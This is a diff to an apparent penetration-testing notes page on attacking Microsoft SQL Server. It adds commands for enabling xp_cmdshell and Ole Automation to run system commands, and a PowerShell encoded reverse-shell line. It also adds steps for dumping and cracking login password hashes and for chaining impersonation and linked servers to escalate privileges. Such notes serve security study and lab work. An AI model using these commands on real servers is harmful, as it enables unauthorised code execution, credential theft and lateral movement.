@@ -25,7 +25,14 @@ pagetitle: Database Attacks
 
 
 ## MSSQL
-- Database management built into Windows	
+- Database management built into Windows
+	- `master` database for system-level details, `msdb` database for scheduling alerts/jobs, `model` database acts as blueprint for new mssqlservers, `resource` database for hosting system objects in read-only fashion, `tempdb` database as temporary storage area
+	- Users v.s. logins
+		- Both users and logins are required to perform database operations
+		- Users dictate who can access the SQL server instance as a whole (but this doesn't provide any database access)
+			- These can be local database users, like `sa`, local Windows users, or Domain users
+			- Thus, a valid user without any database logins wouldn't be able to do anything, despite having credentials to access the server
+		- Logins provide users access to specific databases within the server
 - Controlled via `Invoke-Sqlcmd`
   - `Install-Module -Name SqlServer -Force`
   - `Invoke-Sqlcmd -ServerInstance localhost\{SQL_server_name} -Database {database_like_master} -Query {query}`
@@ -35,26 +42,57 @@ pagetitle: Database Attacks
   - Inspecting linked servers: `Get-SQLServerLink` 
     	- With auth: `-Username {mssql_username} -Password {mssql_password}  -Instance {server_name} -Verbose`
 - Kali has `impacket-mssqlclient` to connect to MSSQL databases
-	- `impacket-mssqlclient {username}@{host IP} -windows-auth`
-		- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
-			- This can be enabled by a user with permissions with 
-			- `EXECUTE sp_configure 'show advanced options', 1; 
-				- Showing advanced options is actually required to run xp_cmdshell
-			- `RECONFIGURE;` 
-			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
-			- `RECONFIGURE;`
-			- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
-	- `-windows-auth` forces the use of NTLM auth (rather than Kerberos)
-	- `trustlink`, `sp_linkedservers`, and `use_link` for linked servers
+	- `impacket-mssqlclient {database_username}:{password}@{host IP}`
+		- `-windows-auth` allows us to authenticate with windows credentials; `-k` to use `.ccache` kerberos auth 
+	- **Command Execution**
+		- Can use `enable_xp_cmdshell` and `xp_cmdshell {command}` to execute commands on the underlying server
+		- Can also use the blind `sp_start_job {command}` to execute commands, or the `sp_OACreate` method described below
+		- Turn this execution into a reverse shell with the python reverse shell generator in Miscellaneous notes
+			- `xp_cmdshell "powershell -exec bypass -enc {b64_payload}"`
+	- **Password Hashes**
+		- Get local database password hashes with `select name,password_hash from sys.sql_logins`
+			- Ignore `##MS##` hashes, since they're usually disabled (can be checked in `sys.sql_logins`) and the passwords are random
+		- Can be cracked with hashcat, but they need to be reorganized
+			- Stored in `b'0200 + 4-byte salt + 64-byte SHA512 hash'` structure, and we need it in `0x{hex}` format, so just remove byte string indicators and add `0x` at the front
+			- Then crack with `hashcat -m 1731`
+	- **Impersonation**
+		- We can use `enum_impersonate` to see who our current user can impersonate (`grantor` category)
+			- We can enumerate both users and logins with `exec_as_user {user}` or `exec_as_login {login}` on their own, which will drop us into a shell as that user/in that database
+				- If the authorized user or login is a domain user, we can pass the domain with `exec_as_{user/login} {domain}\{user}`
+			- From this point, we should run `enum_impersonate` again to see if our new user can impersonate anyone
+		- Our target would be to impersonate either the `sa` user, an equivalently-privileged user, or a `dbo` login of the `system` database
+			- The `dbo` login stands for Database Owner and gives full control over that database
+	- **Linked servers**
+		- After enumerating all accessible users, we can enumerate linked mssql servers with `enum_links`
+		- This will show us what linked servers our current user can use
+			- This will show which users have remote login permissions
+				- If local login `NULL` has a remote login, we can just execute queries without auth
+				- What will be more likely is a user that has impersonation rights with a remote login on another server
+					- Thus, we can log in as that user to the mssql server, run `use_link {server_name}`, and then interact with the database normally
+					- The `sa` user won't show any explicit links, since they're able to impersonate any user with a link
+						- Thus, if there's a user with access to a linked database, we can simply impersonate them using `sa`
+			- Running `enum_links` as `sa` (or equivalent) will show all user links, allowing different chains
+		- Can run basic queries as authorized users with `SELECT * FROM OPENQUERY( {linked_server_name}, '{query}')`
 - List all databases: 
 	- `SELECT name FROM sys.databases;`
 	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
 	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
 		- `dbo` is a table schema
-- Can also use `sp_OACreate` to execute system commands
-	`EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
-- Linked servers can execute remote queries
-  - `SELECT * FROM OPENQUERY( {linked_server_name}, '{query}')`
+- Enabling `xp_cmdshell`:
+	- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
+		- This can be enabled by a user with permissions with 
+			- `EXECUTE sp_configure 'show advanced options', 1; `
+				- Showing advanced options is actually required to run xp_cmdshell
+			- `RECONFIGURE;` 
+			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
+			- `RECONFIGURE;`
+		- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
+- Can also use `sp_OACreate` to execute system commands:
+	- `sp_configure 'show advanced options', 1;`
+	- `RECONFIGURE;` 
+	- `sp_configure 'Ole Automation Procedures', 1;`
+	- `RECONFIGURE;`
+	- `DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
 - Dumping MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`
 
 ## SQLite
